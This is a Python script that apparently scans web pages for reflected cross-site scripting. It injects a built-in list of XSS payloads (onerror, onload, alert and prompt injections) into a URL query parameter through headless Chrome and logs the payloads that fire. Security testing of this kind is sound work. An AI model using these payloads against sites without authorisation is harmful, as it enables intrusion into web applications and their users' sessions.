import urllib.parse
import json
import os
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import  TimeoutException, NoAlertPresentException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from tqdm import tqdm


# payload_url = "https://raw.githubusercontent.com/payloadbox/xss-payload-list/refs/heads/master/Intruder/xss-payload-list.txt" #future update

# Static payloads
payloads = [
    "-prompt(8)-",
    "'-prompt(8)-'",
    '";a=prompt,a()//',
    "';a=prompt,a()//",
    "'-eval(\"window \")-'",
    '"-eval(\\"window \\")-"',
    '"onclick=prompt(8)>"@x.y',
    '"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y',
    '<image/src/onerror=prompt(8)>',
    '<img/src/onerror=prompt(8)>',
    '<image src/onerror=prompt(8)>',
    '<img src/onerror=prompt(8)>',
    '<image src=q onerror=prompt(8)>',
    '<img src=q onerror=prompt(8)>',
    '</scrip</script>t><img src=q onerror=prompt(8)>',
    '<svg onload=alert(1)>',
    '"><svg onload=alert(1)//',
    '"onmouseover=alert(1)//',
    '"autofocus/onfocus=alert(1)//',
    "'-alert(1)-'",
    "'-alert(1)//",
    "'\\'-alert(1)//"
]

def setup_browser():
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")

    # Match your local Chromium version (132)
    driver_path = ChromeDriverManager(version="114.0.5735.90").install()  # ❌ old
    # Use `browser_version="132"` instead (auto-resolve correct version)
    driver_path = ChromeDriverManager(browser_version="132").install()    # ✅ correct
    service = Service(driver_path)

    driver = webdriver.Chrome(service=service, options=chrome_options)
    driver.set_page_load_timeout(10)
    return driver

def xss_selenium(url):
    driver = setup_browser()
    working_payloads = []
    vuln_url = None

    for payload in tqdm(payloads, desc="Testing Payloads", leave=False):
        encoded_payload = urllib.parse.quote(payload)
        test_url = url.replace("query=something", f"query={encoded_payload}")
        try:
            driver.get(test_url)
            try:
                WebDriverWait(driver, 2).until(EC.alert_is_present())
                alert = driver.switch_to.alert
                alert.accept()
                working_payloads.append(payload)
                if not vuln_url:
                    vuln_url = test_url
            except (NoAlertPresentException, TimeoutException):
                pass
        except:
            pass

    driver.quit()

    if working_payloads:
        print("XSS Vulnerability Scanning Completed")
        return {
            "vulnerability": "Reflected XSS",
            "value": {
                "vuln_url": vuln_url,
                "payloads": working_payloads,
                "severity": "High"
            }
        }
    else:
        return None
    
    
def xss_vuln_report(data, filename_prefix="xss_summary"):
    if not data:
        return

    os.makedirs("data", exist_ok=True)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{filename_prefix}_{timestamp}.json"

    filepath = os.path.join("data", filename)
    with open(filepath, "w") as f:
        json.dump(data, f, indent=4)

    print(f"XSS Report saved to: {filepath}")
